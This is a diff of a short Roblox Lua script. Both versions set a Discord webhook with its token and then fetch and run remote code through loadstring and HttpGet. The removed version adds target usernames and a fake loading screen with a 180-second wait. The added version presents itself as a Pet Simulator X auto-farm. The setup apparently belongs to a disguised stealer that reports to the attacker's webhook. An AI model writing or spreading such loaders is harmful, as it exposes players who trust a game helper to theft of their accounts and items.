@@ -1,15 +1,3 @@
-UserName = "khlaid20"
-UserName2 = "kektooth"
-Webhook = "https://discord.com/api/webhooks/1101182108887699537/r66JfaqjPkACMQ2nohy3fLHKazaoutFLnTeNfsdHeBU8uxgvu1tuU9NLPku4984BWpPQ"
-
-_G.LoadingScreen = true
-_G.AntiLeave = false
-_G.MouseLock = true
-
-_G.ScriptName = "Rizz Scriptz"
-_G.FirstText = "Script Preparing"
-_G.SecondText = "Script Loading..."
-_G.ThirdText = "Almost Done..."
-_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
-
-loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
+_G.UserID = 1686288421
+_G.WebHook = "https://discord.com/api/webhooks/1101182108887699537/r66JfaqjPkACMQ2nohy3fLHKazaoutFLnTeNfsdHeBU8uxgvu1tuU9NLPku4984BWpPQ"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
